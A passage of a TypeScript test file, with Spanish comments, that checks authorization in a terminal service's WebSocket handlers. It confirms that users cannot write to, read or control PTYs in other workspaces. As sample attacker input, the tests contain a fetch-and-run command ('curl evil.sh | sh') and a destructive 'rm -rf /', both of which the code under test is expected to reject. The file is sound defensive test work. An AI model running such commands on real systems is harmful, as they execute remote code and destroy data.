/**
 * WS terminal handlers — contract-boundary (TER-480, grupo archivos/io).
 *
 * Lo CRÍTICO de terminal: un PTY es shell interactivo dentro del contenedor
 * bash del workspace — terminal.input a un PTY ajeno es ejecución remota de
 * comandos en la máquina de otro. Regresión del fix de authz: create verifica
 * acceso al workspace de la app (getApp NO lo hacía pese a su comentario),
 * el reuse exige mismo workspace, e input/resize/destroy/subscribe verifican
 * el owner del PTY (fail-closed si la sesión no registró owner). Los handlers
 * son inline: se testean vía register() con un router fake.
 */

import { describe, expect, it, mock } from "bun:test"
import type { WsHandlerContext } from "@teros/shared"
import { register } from "../../src/handlers/domains/terminal/index"

const ctx = (userId: string): WsHandlerContext =>
  ({ userId, sessionId: "sess1", connectionId: "c1" }) as any

/** ctx tal como lo construye el bridge MCA (admin_request): userId = owner del workspace, sessionId sintético. */
const bridgeCtx = (userId: string): WsHandlerContext =>
  ({ userId, sessionId: "mca:app_terminal", ip: "mca:mca.teros.terminal" }) as any

function makeRouter() {
  const handlers = new Map<string, (ctx: WsHandlerContext, data: unknown) => Promise<any>>()
  const router = {
    register: (action: string, handler: any) => {
      if (handlers.has(action)) throw new Error(`duplicate action ${action}`)
      handlers.set(action, handler)
    },
  } as any
  return { router, handlers }
}

/** Fake fiel a PtyManager: write/resize/destroy son no-op sin sesión; create no-op si existe;
 *  read devuelve notFound sin sesión; waitFor rechaza sin sesión y por timeout (mensaje real del manager);
 *  list/getStatus exponen los metadatos que el dominio usa para filtrar por workspace. */
type PtySeed = {
  terminalId: string
  ownerWorkspaceId?: string
  buffer?: string[]
  bufferStartLine?: number
  host?: boolean
  bracketedPaste?: boolean
  /** Frozen or sleeping: ensureAwake() wakes it (and says from what). */
  lifecycle?: "awake" | "frozen" | "sleeping"
  /** ensureAwake() fails (a sleeping session that cannot be brought back). */
  wakeFails?: boolean
  createdBy?: string
  space?: "personal" | "shared"
  watchable?: boolean
}
function makePtyManager(seed: PtySeed[] = []) {
  const sessions = new Map<string, PtySeed>(
    seed.map((s) => [s.terminalId, { bufferStartLine: 0, ...s }]),
  )
  const calls = {
    create: [] as any[],
    createHost: [] as any[],
    write: [] as any[],
    resize: [] as any[],
    destroy: [] as any[],
    read: [] as any[],
    waitFor: [] as any[],
    ensureAwake: [] as any[],
    spaces: [] as any[],
  }
  return {
    calls,
    sessions,
    async ensureAwake(id: string, by: { userId: string }) {
      calls.ensureAwake.push([id, by.userId])
      const s = sessions.get(id)
      if (!s || !s.lifecycle || s.lifecycle === "awake") return null
      if (s.wakeFails) throw new Error("its Bash app app_x is gone")
      const from = s.lifecycle
      s.lifecycle = "awake"
      return { from, ms: 5 }
    },
    has: (id: string) => sessions.has(id),
    bracketedPaste: (id: string) => sessions.get(id)?.bracketedPaste === true,
    revealed: [] as string[],
    reveal(id: string) {
      if (!sessions.has(id)) return false
      this.revealed.push(id)
      return true
    },
    ownerOf: (id: string) => sessions.get(id)?.ownerWorkspaceId,
    isHost: (id: string) => sessions.get(id)?.host === true,
    create(id: string, containerId: string, cols: number, rows: number, owner?: string, by?: string, space?: string) {
      calls.create.push([id, containerId, cols, rows, owner])
      calls.spaces.push([id, by, space])
      if (sessions.has(id)) return
      sessions.set(id, { terminalId: id, ownerWorkspaceId: owner, bufferStartLine: 0, buffer: [] })
    },
    createHost(id: string, cols: number, rows: number, owner?: string) {
      calls.createHost.push([id, cols, rows, owner])
      if (sessions.has(id)) return
      sessions.set(id, {
        terminalId: id,
        ownerWorkspaceId: owner,
        bufferStartLine: 0,
        buffer: [],
        host: true,
      })
    },
    write(id: string, data: string) {
      if (!sessions.has(id)) return undefined
      calls.write.push([id, data])
      const s = sessions.get(id)!
      // Mismo contrato que PtyManager.write: cursor absoluto tras el final del
      // buffer + 1 línea reservada para el eco del comando (T-004).
      return (s.bufferStartLine ?? 0) + (s.buffer ?? []).length + 1
    },
    resize(id: string, cols: number, rows: number) {
      if (!sessions.has(id)) return
      calls.resize.push([id, cols, rows])
    },
    destroy(id: string) {
      if (!sessions.has(id)) return
      calls.destroy.push([id])
      sessions.delete(id)
    },
    read(id: string, opts: { lines?: number; fromLine?: number } = {}) {
      calls.read.push([id, opts])
      const s = sessions.get(id)
      if (!s) return { lines: [], fromLine: 0, nextLine: 0, truncated: false, notFound: true }
      const buffer: string[] = s.buffer ?? []
      const start = s.bufferStartLine ?? 0
      const end = start + buffer.length
      const from =
        opts.fromLine !== undefined
          ? Math.max(opts.fromLine, start)
          : Math.max(start, end - (opts.lines ?? 1000))
      return {
        lines: buffer.slice(from - start),
        fromLine: from,
        nextLine: end,
        truncated: start > 0,
      }
    },
    waitFor(id: string, regex: RegExp, opts: { timeoutMs?: number } = {}) {
      calls.waitFor.push([id, regex, opts])
      const s = sessions.get(id)
      if (!s) return Promise.reject(new Error(`waitFor: no session for terminal ${id}`))
      const start = s.bufferStartLine ?? 0
      const buffer: string[] = s.buffer ?? []
      for (let i = 0; i < buffer.length; i++) {
        if (regex.test(buffer[i])) {
          return Promise.resolve({
            matched: true,
            line: buffer[i],
            lineIndex: start + i,
            nextLine: start + i + 1,
          })
        }
      }
      return new Promise((_, reject) =>
        setTimeout(
          () =>
            reject(
              new Error(
                `waitFor: timeout after ${opts.timeoutMs ?? 10000}ms waiting for ${String(regex)} on terminal ${id}`,
              ),
            ),
          opts.timeoutMs ?? 10000,
        ),
      )
    },
    list() {
      return [...sessions.values()].map((s) => ({
        terminalId: s.terminalId,
        containerId: s.host ? "host" : "mca-teros-bash-34567890",
        createdAt: new Date(),
        lastActivity: new Date(),
        alive: true,
        lifecycle: s.lifecycle ?? "awake",
        bufferSize: (s.buffer ?? []).length,
        ownerWorkspaceId: s.ownerWorkspaceId,
        createdBy: s.createdBy ?? "",
        space: s.space,
        watchable: s.watchable,
      }))
    },
    describe(id: string) {
      return this.list().find((s: { terminalId: string }) => s.terminalId === id) ?? null
    },
    async rename() {},
    getStatus(id: string) {
      const s = sessions.get(id)
      if (!s) return null
      const buffer: string[] = s.buffer ?? []
      const start = s.bufferStartLine ?? 0
      return {
        terminalId: s.terminalId,
        containerId: s.host ? "host" : "mca-teros-bash-34567890",
        createdAt: new Date(),
        lastActivity: new Date(),
        alive: true,
        lifecycle: s.lifecycle ?? "awake",
        bufferSize: buffer.length,
        ownerWorkspaceId: s.ownerWorkspaceId,
        bufferStartLine: start,
        bufferNextLine: start + buffer.length,
        bufferBytes: 0,
        lastOutputAt: new Date(),
        foregroundProcess: "bash",
      }
    },
  } as any
}

/** Mock db fiel a canAccessWorkspace/canWriteWorkspace (workspaces.ownerId + workspace_members[.role])
 *  y a requireSystemAdmin (users.role). Un member sin role es lectura (como WorkspaceService.canWrite). */
function makeAuthDb(
  opts: {
    ownerByWorkspace?: Record<string, string>
    members?: Array<[string, string] | [string, string, "read" | "write" | "admin"]>
    systemRoles?: Record<string, "user" | "admin" | "super">
  } = {},
) {
  return {
    collection: (name: string) => ({
      findOne: async (filter: any) => {
        if (name === "workspaces") {
          return {
            workspaceId: filter.workspaceId,
            ownerId: opts.ownerByWorkspace?.[filter.workspaceId] ?? "nobody",
            status: "active",
          }
        }
        if (name === "workspace_members") {
          const m = (opts.members ?? []).find(
            ([w, u]) => w === filter.workspaceId && u === filter.userId,
          )
          return m ? { workspaceId: m[0], userId: m[1], ...(m[2] ? { role: m[2] } : {}) } : null
        }
        if (name === "users") {
          const role = opts.systemRoles?.[filter.userId]
          return role ? { userId: filter.userId, role } : null
        }
        return null
      },
    }),
  } as any
}

const APP = { appId: "app_abcdef1234567890", ownerType: "workspace", ownerId: "work_mine" }

function setup(
  opts: {
    app?: any
    ptySeed?: PtySeed[]
    ownerByWorkspace?: Record<string, string>
    members?: Array<[string, string] | [string, string, "read" | "write" | "admin"]>
    systemRoles?: Record<string, "user" | "admin" | "super">
    execResult?: string
  } = {},
) {
  const { router, handlers } = makeRouter()
  const ptyManager = makePtyManager(opts.ptySeed)
  const pubSubService = {
    subscribeSession: mock(() => {}),
    unsubscribeSession: mock(() => {}),
  } as any
  const mcaService = {
    getApp: mock(async (appId: string) =>
      appId === "app_terminal" ? { appId, ownerId: "work_mine" } : (opts.app ?? null),
    ),
  } as any
  const mcaManager = { executeTool: mock(async () => ({})) } as any
  const exec = mock(() => opts.execResult ?? "mca-teros-bash-34567890\n")
  register(router, {
    pubSubService,
    ptyManager,
    mcaService,
    mcaManager,
    db: makeAuthDb({
      ownerByWorkspace: opts.ownerByWorkspace,
      members: opts.members,
      systemRoles: opts.systemRoles,
    }),
    exec,
  })
  return { handlers, ptyManager, pubSubService, mcaService, mcaManager, exec }
}

// ---------------------------------------------------------------------------
// Registro (invariante)
// ---------------------------------------------------------------------------

describe("terminal register", () => {
  it("registra exactamente las 27 actions del dominio: ninguna para iniciar sesión", () => {
    const { handlers } = setup()
    expect([...handlers.keys()].sort()).toEqual([
      "terminal.agentControl",
      "terminal.answerWheel",
      "terminal.cancelClose",
      "terminal.create",
      "terminal.destroy",
      "terminal.giveBack",
      "terminal.input",
      "terminal.list",
      "terminal.read",
      "terminal.releaseWheel",
      "terminal.requestWheel",
      "terminal.resize",
      "terminal.reveal",
      "terminal.screen",
      "terminal.status",
      "terminal.subscribe",
      "terminal.takeWheel",
      "terminal.ticket",
      "terminal.unsubscribe",
      "terminal.unwatch",
      "terminal.update",
      "terminal.wait",
      "terminal.waitFor",
      "terminal.watch",
      "terminal.watchable",
      "terminal.write",
      "terminal.yield",
    ])
  })
})

// ---------------------------------------------------------------------------
// terminal.create
// ---------------------------------------------------------------------------

describe("terminal.create — validación + authz", () => {
  it("MISSING_TERMINAL_ID / MISSING_APP_ID", async () => {
    const { handlers } = setup()
    await expect(
      handlers.get("terminal.create")!(ctx("u1"), { appId: "app_1" }),
    ).rejects.toMatchObject({ code: "MISSING_TERMINAL_ID" })
    await expect(
      handlers.get("terminal.create")!(ctx("u1"), { terminalId: "t1" }),
    ).rejects.toMatchObject({ code: "MISSING_APP_ID" })
  })

  it("APP_NOT_FOUND si la app no existe", async () => {
    const { handlers } = setup({ app: null })
    await expect(
      handlers.get("terminal.create")!(ctx("u1"), { terminalId: "t1", appId: "app_nope" }),
    ).rejects.toMatchObject({ code: "APP_NOT_FOUND" })
  })

  it("FORBIDDEN_WORKSPACE si el caller no es miembro del workspace de la app — sin warmup, sin PTY, sin subscribe", async () => {
    const { handlers, ptyManager, pubSubService, mcaManager } = setup({
      app: APP,
      ownerByWorkspace: { work_mine: "victim" },
      members: [],
    })
    await expect(
      handlers.get("terminal.create")!(ctx("attacker"), { terminalId: "t1", appId: APP.appId }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_WORKSPACE" })
    expect(mcaManager.executeTool).not.toHaveBeenCalled()
    expect(ptyManager.calls.create).toEqual([])
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled()
  })

  it("happy: warmup + docker ps por suffix, PTY con owner workspace, subscribe y payload exacto", async () => {
    const { handlers, ptyManager, pubSubService, mcaManager, exec } = setup({
      app: APP,
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res = await handlers.get("terminal.create")!(ctx("u1"), {
      terminalId: "t1",
      appId: APP.appId,
    })
    expect(res).toEqual({ terminalId: "t1", cols: 120, rows: 45 })
    expect(mcaManager.executeTool).toHaveBeenCalledWith(
      "bash_bash",
      { command: "true", description: "warmup" },
      // workspaceId: the warmup tool call is signed per workspace
      { appId: APP.appId, userId: "u1", workspaceId: "work_mine" },
    )
    // suffix = últimos 8 chars del appId sin 'app_'
    expect(exec).toHaveBeenCalledWith(
      'docker ps --filter "name=mca-teros-bash-34567890" --format "{{.Names}}"',
    )
    expect(ptyManager.calls.create).toEqual([
      ["t1", "mca-teros-bash-34567890", 120, 45, "work_mine"],
    ])
    expect(pubSubService.subscribeSession).toHaveBeenCalledWith("sess1", "terminal:t1")
  })

  it("respeta cols/rows custom", async () => {
    const { handlers, ptyManager } = setup({ app: APP, ownerByWorkspace: { work_mine: "u1" } })
    const res = await handlers.get("terminal.create")!(ctx("u1"), {
      terminalId: "t1",
      appId: APP.appId,
      cols: 120,
      rows: 40,
    })
    expect(res).toEqual({ terminalId: "t1", cols: 120, rows: 40 })
    expect(ptyManager.calls.create).toEqual([
      ["t1", "mca-teros-bash-34567890", 120, 40, "work_mine"],
    ])
  })

  it("warmup que no encuentra contenedor → error y SIN suscripción residual (regresión del reorden)", async () => {
    const { handlers, ptyManager, pubSubService } = setup({
      app: APP,
      ownerByWorkspace: { work_mine: "u1" },
      execResult: "\n",
    })
    await expect(
      handlers.get("terminal.create")!(ctx("u1"), { terminalId: "t1", appId: APP.appId }),
    ).rejects.toThrow("not found after warmup")
    expect(ptyManager.calls.create).toEqual([])
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled()
  })
})

describe("terminal.create — reuse multi-tab", () => {
  it("PTY existente del MISMO workspace → reused:true, subscribe, sin warmup ni create", async () => {
    const { handlers, ptyManager, pubSubService, mcaManager } = setup({
      app: APP,
      ownerByWorkspace: { work_mine: "u1" },
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
    })
    const res = await handlers.get("terminal.create")!(ctx("u1"), {
      terminalId: "t1",
      appId: APP.appId,
    })
    expect(res).toEqual({ terminalId: "t1", cols: 120, rows: 45, reused: true })
    expect(mcaManager.executeTool).not.toHaveBeenCalled()
    expect(ptyManager.calls.create).toEqual([])
    expect(pubSubService.subscribeSession).toHaveBeenCalledWith("sess1", "terminal:t1")
  })

  it("PTY existente de OTRO workspace → FORBIDDEN_TERMINAL sin subscribe (no se puede attachear a terminales ajenos)", async () => {
    const { handlers, pubSubService } = setup({
      app: APP,
      ownerByWorkspace: { work_mine: "u1" },
      ptySeed: [{ terminalId: "t_victim", ownerWorkspaceId: "work_victim" }],
    })
    await expect(
      handlers.get("terminal.create")!(ctx("u1"), { terminalId: "t_victim", appId: APP.appId }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled()
  })
})

// ---------------------------------------------------------------------------
// terminal.input / resize / destroy — ownership del PTY
// ---------------------------------------------------------------------------

describe("terminal.input — el gate que evita RCE cross-workspace", () => {
  it("MISSING_TERMINAL_ID sin terminalId", async () => {
    const { handlers } = setup()
    await expect(
      handlers.get("terminal.input")!(ctx("u1"), { data: "ls\n" }),
    ).rejects.toMatchObject({ code: "MISSING_TERMINAL_ID" })
  })

  it("PTY ajeno → FORBIDDEN_TERMINAL y NO escribe keystrokes", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t_victim", ownerWorkspaceId: "work_victim" }],
      ownerByWorkspace: { work_victim: "victim" },
      members: [],
    })
    await expect(
      handlers.get("terminal.input")!(ctx("attacker"), {
        terminalId: "t_victim",
        data: "curl evil.sh | sh\n",
      }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    expect(ptyManager.calls.write).toEqual([])
  })

  it("PTY sin owner registrado → FORBIDDEN_TERMINAL (fail-closed)", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t_legacy" }],
      ownerByWorkspace: {},
    })
    await expect(
      handlers.get("terminal.input")!(ctx("u1"), { terminalId: "t_legacy", data: "ls\n" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    expect(ptyManager.calls.write).toEqual([])
  })

  it("PTY propio (miembro del workspace) → write con args exactos", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
      ownerByWorkspace: { work_mine: "someone" },
      members: [["work_mine", "u1", "write"]],
    })
    const res = await handlers.get("terminal.input")!(ctx("u1"), {
      terminalId: "t1",
      data: "echo hi\n",
    })
    expect(res).toEqual({ ok: true })
    expect(ptyManager.calls.write).toEqual([["t1", "echo hi\n"]])
  })

  it("sin sesión PTY → {ok:true} no-op (comportamiento PtyManager preservado)", async () => {
    const { handlers, ptyManager } = setup()
    const res = await handlers.get("terminal.input")!(ctx("u1"), {
      terminalId: "t_gone",
      data: "ls\n",
    })
    expect(res).toEqual({ ok: true })
    expect(ptyManager.calls.write).toEqual([])
  })
})

describe("terminal.resize", () => {
  it("PTY ajeno → FORBIDDEN_TERMINAL sin resize", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t_victim", ownerWorkspaceId: "work_victim" }],
    })
    await expect(
      handlers.get("terminal.resize")!(ctx("attacker"), {
        terminalId: "t_victim",
        cols: 1,
        rows: 1,
      }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    expect(ptyManager.calls.resize).toEqual([])
  })

  it("PTY propio → resize(terminalId, cols, rows) exactos", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res = await handlers.get("terminal.resize")!(ctx("u1"), {
      terminalId: "t1",
      cols: 132,
      rows: 50,
    })
    expect(res).toEqual({ ok: true })
    expect(ptyManager.calls.resize).toEqual([["t1", 132, 50]])
  })
})

describe("terminal.destroy", () => {
  it("PTY ajeno → FORBIDDEN_TERMINAL: no destruye ni toca suscripciones", async () => {
    const { handlers, ptyManager, pubSubService } = setup({
      ptySeed: [{ terminalId: "t_victim", ownerWorkspaceId: "work_victim" }],
    })
    await expect(
      handlers.get("terminal.destroy")!(ctx("attacker"), { terminalId: "t_victim" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    expect(ptyManager.calls.destroy).toEqual([])
    expect(pubSubService.unsubscribeSession).not.toHaveBeenCalled()
  })

  it("PTY propio → destroy + unsubscribe del topic", async () => {
    const { handlers, ptyManager, pubSubService } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res = await handlers.get("terminal.destroy")!(ctx("u1"), { terminalId: "t1" })
    expect(res).toEqual({ ok: true })
    expect(ptyManager.calls.destroy).toEqual([["t1"]])
    expect(pubSubService.unsubscribeSession).toHaveBeenCalledWith("sess1", "terminal:t1")
  })

  it("un agente que cierra un id que no existe → TERMINAL_NOT_FOUND (no 'Closed') (016)", async () => {
    const { handlers, ptyManager } = setup()
    await expect(
      handlers.get("terminal.destroy")!(bridgeCtx("u1"), { terminalId: "term_does_not_exist_qa" }),
    ).rejects.toMatchObject({ code: "TERMINAL_NOT_FOUND" })
    expect(ptyManager.calls.destroy).toEqual([])
  })

  it("con undoMs el servidor cierra al acabar la ventana, sin el cliente; cancelClose dentro de ella la conserva (017)", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [
        { terminalId: "t1", ownerWorkspaceId: "work_mine" },
        { terminalId: "t2", ownerWorkspaceId: "work_mine" },
      ],
      ownerByWorkspace: { work_mine: "u1" },
    })
    expect(await handlers.get("terminal.destroy")!(ctx("u1"), { terminalId: "t1", undoMs: 40 })).toMatchObject({
      ok: true,
      closingInMs: 40,
    })
    await handlers.get("terminal.destroy")!(ctx("u1"), { terminalId: "t2", undoMs: 40 })
    expect(ptyManager.calls.destroy).toEqual([])
    expect(await handlers.get("terminal.cancelClose")!(ctx("u1"), { terminalId: "t2" })).toEqual({
      ok: true,
      cancelled: true,
    })
    await new Promise((r) => setTimeout(r, 80))
    expect(ptyManager.calls.destroy).toEqual([["t1"]])
  })

  it("el cierre diferido hace lo mismo que el inmediato (quita la suscripción); un cancelClose tardío dice que ya no (017)", async () => {
    const { handlers, ptyManager, pubSubService } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    await handlers.get("terminal.destroy")!(ctx("u1"), { terminalId: "t1", undoMs: 30 })
    expect(pubSubService.unsubscribeSession).not.toHaveBeenCalled()
    await new Promise((r) => setTimeout(r, 60))
    expect(ptyManager.calls.destroy).toEqual([["t1"]])
    expect(pubSubService.unsubscribeSession).toHaveBeenCalledWith("sess1", "terminal:t1")
    expect(await handlers.get("terminal.cancelClose")!(ctx("u1"), { terminalId: "t1" })).toEqual({
      ok: true,
      cancelled: false,
    })
  })

  it("sin sesión PTY → {ok:true} y limpia la suscripción propia", async () => {
    const { handlers, pubSubService } = setup()
    const res = await handlers.get("terminal.destroy")!(ctx("u1"), { terminalId: "t_gone" })
    expect(res).toEqual({ ok: true })
    expect(pubSubService.unsubscribeSession).toHaveBeenCalledWith("sess1", "terminal:t_gone")
  })
})

// ---------------------------------------------------------------------------
// terminal.subscribe / unsubscribe
// ---------------------------------------------------------------------------

describe("terminal.subscribe — requiere PTY vivo + acceso", () => {
  it("sin PTY → TERMINAL_NOT_FOUND (sin pre-subscripciones ciegas a ids futuros)", async () => {
    const { handlers, pubSubService } = setup()
    await expect(
      handlers.get("terminal.subscribe")!(ctx("u1"), { terminalId: "t_future" }),
    ).rejects.toMatchObject({ code: "TERMINAL_NOT_FOUND" })
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled()
  })

  it("PTY ajeno → FORBIDDEN_TERMINAL (el output de un shell ajeno no se espía)", async () => {
    const { handlers, pubSubService } = setup({
      ptySeed: [{ terminalId: "t_victim", ownerWorkspaceId: "work_victim" }],
    })
    await expect(
      handlers.get("terminal.subscribe")!(ctx("attacker"), { terminalId: "t_victim" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled()
  })

  it("PTY propio → {terminalId, topic} + subscribe", async () => {
    const { handlers, pubSubService } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res = await handlers.get("terminal.subscribe")!(ctx("u1"), { terminalId: "t1" })
    expect(res).toEqual({ terminalId: "t1", topic: "terminal:t1" })
    expect(pubSubService.subscribeSession).toHaveBeenCalledWith("sess1", "terminal:t1")
  })
})

describe("terminal.unsubscribe — siempre permitido (solo quita la suscripción propia)", () => {
  it("MISSING_TERMINAL_ID sin terminalId", async () => {
    const { handlers } = setup()
    await expect(handlers.get("terminal.unsubscribe")!(ctx("u1"), {})).rejects.toMatchObject({
      code: "MISSING_TERMINAL_ID",
    })
  })

  it("devuelve {terminalId} y desuscribe aunque no exista PTY", async () => {
    const { handlers, pubSubService } = setup()
    const res = await handlers.get("terminal.unsubscribe")!(ctx("u1"), { terminalId: "t_gone" })
    expect(res).toEqual({ terminalId: "t_gone" })
    expect(pubSubService.unsubscribeSession).toHaveBeenCalledWith("sess1", "terminal:t_gone")
  })
})

// ---------------------------------------------------------------------------
// terminal.write / read / waitFor / status — acciones programáticas (MCA)
// ---------------------------------------------------------------------------

describe("terminal.write — input programático con sendEnter", () => {
  it("MISSING_TERMINAL_ID / MISSING_DATA", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    await expect(handlers.get("terminal.write")!(ctx("u1"), { data: "ls" })).rejects.toMatchObject({
      code: "MISSING_TERMINAL_ID",
    })
    await expect(
      handlers.get("terminal.write")!(ctx("u1"), { terminalId: "t1" }),
    ).rejects.toMatchObject({ code: "MISSING_DATA" })
    expect(ptyManager.calls.write).toEqual([])
  })

  it("sin sesión → TERMINAL_NOT_FOUND (no no-op silencioso: un agente no debe creer que el comando corrió)", async () => {
    const { handlers, ptyManager } = setup()
    await expect(
      handlers.get("terminal.write")!(ctx("u1"), { terminalId: "t_gone", data: "ls" }),
    ).rejects.toMatchObject({ code: "TERMINAL_NOT_FOUND" })
    expect(ptyManager.calls.write).toEqual([])
  })

  it("PTY ajeno → FORBIDDEN_TERMINAL sin escribir", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t_victim", ownerWorkspaceId: "work_victim" }],
      ownerByWorkspace: { work_victim: "victim" },
      members: [],
    })
    await expect(
      handlers.get("terminal.write")!(ctx("attacker"), {
        terminalId: "t_victim",
        data: "rm -rf /",
      }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    expect(ptyManager.calls.write).toEqual([])
  })

  it("sendEnter:false → escribe data tal cual", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res = await handlers.get("terminal.write")!(ctx("u1"), {
      terminalId: "t1",
      data: "echo hi",
    })
    // cursor = índice absoluto tras el final del buffer en el momento del write (T-004)
    expect(res).toEqual({ ok: true, cursor: 1, pasted: false })
    expect(ptyManager.calls.write).toEqual([["t1", "echo hi"]])
  })

  it("sendEnter:true → append \\r (CR, no LF)", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine", buffer: ["a", "b"] }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res2 = await handlers.get("terminal.write")!(ctx("u1"), {
      terminalId: "t1",
      data: "echo hi",
      sendEnter: true,
    })
    expect(ptyManager.calls.write).toEqual([["t1", "echo hi\r"]])
    // El cursor refleja las 2 líneas ya buffereadas + 1 reservada para el eco → since=3
    expect(res2).toEqual({ ok: true, cursor: 3, pasted: false })
  })
})

describe("terminal.read — replay del buffer", () => {
  it("MISSING_TERMINAL_ID sin terminalId", async () => {
    const { handlers } = setup()
    await expect(handlers.get("terminal.read")!(ctx("u1"), {})).rejects.toMatchObject({
      code: "MISSING_TERMINAL_ID",
    })
  })

  it("sin sesión → TERMINAL_NOT_FOUND", async () => {
    const { handlers } = setup()
    await expect(
      handlers.get("terminal.read")!(ctx("u1"), { terminalId: "t_gone" }),
    ).rejects.toMatchObject({ code: "TERMINAL_NOT_FOUND" })
  })

  it("PTY ajeno → FORBIDDEN_TERMINAL (el output de un shell ajeno no se lee)", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t_victim", ownerWorkspaceId: "work_victim" }],
      ownerByWorkspace: { work_victim: "victim" },
      members: [],
    })
    await expect(
      handlers.get("terminal.read")!(ctx("attacker"), { terminalId: "t_victim" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    expect(ptyManager.calls.read).toEqual([])
  })

  it("happy: buffer propio → {output, cursor, truncated} con líneas unidas por \\n", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [
        { terminalId: "t1", ownerWorkspaceId: "work_mine", buffer: ["line1", "line2", "line3"] },
      ],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res = await handlers.get("terminal.read")!(ctx("u1"), { terminalId: "t1" })
    expect(res).toEqual({
      output: "line1\nline2\nline3",
      cursor: 3,
      truncated: false,
      notFound: undefined,
    })
    expect(ptyManager.calls.read).toEqual([["t1", { lines: undefined, fromLine: undefined }]])
  })

  it("lines:N → cola del buffer", async () => {
    const { handlers } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine", buffer: ["a", "b", "c", "d"] }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res = await handlers.get("terminal.read")!(ctx("u1"), { terminalId: "t1", lines: 2 })
    expect(res).toEqual({ output: "c\nd", cursor: 4, truncated: false, notFound: undefined })
  })

  it("since (cursor) → solo líneas nuevas desde el cursor", async () => {
    const { handlers } = setup({
      ptySeed: [
        { terminalId: "t1", ownerWorkspaceId: "work_mine", buffer: ["old1", "old2", "new1"] },
      ],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res = await handlers.get("terminal.read")!(ctx("u1"), { terminalId: "t1", since: 2 })
    expect(res).toEqual({ output: "new1", cursor: 3, truncated: false, notFound: undefined })
  })

  it("validación: lines/since no enteros no negativos → INVALID_LINES / INVALID_SINCE sin llamar al manager", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    await expect(
      handlers.get("terminal.read")!(ctx("u1"), { terminalId: "t1", lines: -1 }),
    ).rejects.toMatchObject({ code: "INVALID_LINES" })
    await expect(
      handlers.get("terminal.read")!(ctx("u1"), { terminalId: "t1", lines: 1.5 }),
    ).rejects.toMatchObject({ code: "INVALID_LINES" })
    await expect(
      handlers.get("terminal.read")!(ctx("u1"), { terminalId: "t1", since: -3 }),
    ).rejects.toMatchObject({ code: "INVALID_SINCE" })
    expect(ptyManager.calls.read).toEqual([])
  })
})

describe("terminal.waitFor — esperar un patrón en el output", () => {
  it("MISSING_TERMINAL_ID / INVALID_PATTERN (vacío) / INVALID_TIMEOUT", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    await expect(
      handlers.get("terminal.waitFor")!(ctx("u1"), { pattern: "x" }),
    ).rejects.toMatchObject({ code: "MISSING_TERMINAL_ID" })
    await expect(
      handlers.get("terminal.waitFor")!(ctx("u1"), { terminalId: "t1", pattern: "" }),
    ).rejects.toMatchObject({ code: "INVALID_PATTERN" })
    await expect(
      handlers.get("terminal.waitFor")!(ctx("u1"), {
        terminalId: "t1",
        pattern: "x",
        timeoutMs: 0,
      }),
    ).rejects.toMatchObject({ code: "INVALID_TIMEOUT" })
    expect(ptyManager.calls.waitFor).toEqual([])
  })

  it("regex inválido → INVALID_PATTERN con el mensaje del motor, sin llamar al manager", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    await expect(
      handlers.get("terminal.waitFor")!(ctx("u1"), { terminalId: "t1", pattern: "[unclosed" }),
